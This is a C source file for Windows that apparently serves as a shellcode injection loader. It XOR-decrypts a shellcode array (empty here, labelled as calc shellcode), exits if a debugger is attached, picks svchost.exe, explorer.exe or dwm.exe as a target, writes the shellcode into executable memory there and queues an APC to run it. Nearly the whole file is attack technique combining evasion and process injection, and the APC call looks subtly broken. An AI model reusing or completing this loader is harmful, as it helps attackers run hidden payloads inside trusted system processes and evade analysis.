#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include <string.h>

// XOR key for shellcode encryption
#define XOR_KEY 0x5A

// Encrypted shellcode (original calc shellcode XORed with XOR_KEY)
const unsigned char EncryptedX64CalcShellcode[] = {

};

// Function to decrypt shellcode
VOID DecryptShellcode(PBYTE pShellcode, SIZE_T Size, BYTE Key) {
    for (SIZE_T i = 0; i < Size; i++) {
        pShellcode[i] ^= Key;
    }
}

// Anti-debugging: Check for debugger presence
BOOL IsDebuggerPresentEnhanced() {
    BOOL bDebuggerPresent = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebuggerPresent);
    return IsDebuggerPresent() || bDebuggerPresent;
}

// Get a suitable target process
DWORD GetTargetProcessId() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe32 = { .dwSize = sizeof(PROCESSENTRY32W) };
    DWORD targetPid = 0;
    WCHAR* commonProcesses[] = { L"svchost.exe", L"explorer.exe", L"dwm.exe", NULL };

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            for (int i = 0; commonProcesses[i] != NULL; i++) {
                if (_wcsicmp(pe32.szExeFile, commonProcesses[i]) == 0) {
                    targetPid = pe32.th32ProcessID;
                    break;
                }
            }
        } while (!targetPid && Process32NextW(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return targetPid;
}

// APC injection routine
VOID WINAPI APCInjectionRoutine(PVOID lpParameter, PVOID lpThreadParameter, PVOID lpUnused) {
    // This runs in the target thread's context
    BYTE* shellcode = (BYTE*)lpParameter;
    ((void(*)())shellcode)();
}

int main() {
    // Anti-debugging check
    if (IsDebuggerPresentEnhanced()) {
        printf("[!] Debugger detected, exiting...\n");
        return -1;
    }

    // Get target process ID dynamically
    DWORD targetPid = GetTargetProcessId();
    if (targetPid == 0) {
        printf("[!] No suitable target process found.\n");
        return -1;
    }

    // Open target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (hProcess == NULL) {
        printf("[!] OpenProcess failed: %d\n", GetLastError());
        return -1;
    }

    // Allocate memory in target process
    SIZE_T shellcodeSize = sizeof(EncryptedX64CalcShellcode);
    PVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteBuffer == NULL) {
        printf("[!] VirtualAllocEx failed: %d\n", GetLastError());
        CloseHandle(hProcess);
        return -1;
    }

    // Decrypt shellcode
    BYTE* decryptedShellcode = (BYTE*)malloc(shellcodeSize);
    if (!decryptedShellcode) {
        printf("[!] Memory allocation failed.\n");
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }
    memcpy(decryptedShellcode, EncryptedX64CalcShellcode, shellcodeSize);
    DecryptShellcode(decryptedShellcode, shellcodeSize, XOR_KEY);

    // Write decrypted shellcode to target process
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, remoteBuffer, decryptedShellcode, shellcodeSize, &bytesWritten) || bytesWritten != shellcodeSize) {
        printf("[!] WriteProcessMemory failed: %d\n", GetLastError());
        free(decryptedShellcode);
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }

    // Enumerate threads in target process for APC injection
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[!] CreateToolhelp32Snapshot failed: %d\n", GetLastError());
        free(decryptedShellcode);
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }

    THREADENTRY32 te32 = { .dwSize = sizeof(THREADENTRY32) };
    HANDLE hThread = NULL;
    if (Thread32First(hSnapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == targetPid) {
                hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te32.th32ThreadID);
                if (hThread) {
                    // Queue APC to execute shellcode
                    if (QueueUserAPC((PAPCFUNC)APCInjectionRoutine, hThread, (ULONG_PTR)remoteBuffer)) {
                        printf("[+] APC queued to thread %d in process %d\n", te32.th32ThreadID, targetPid);
                    }
                    CloseHandle(hThread);
                    break;
                }
            }
        } while (Thread32Next(hSnapshot, &te32));
    }

    CloseHandle(hSnapshot);
    free(decryptedShellcode);
    CloseHandle(hProcess);
    return 0;
}
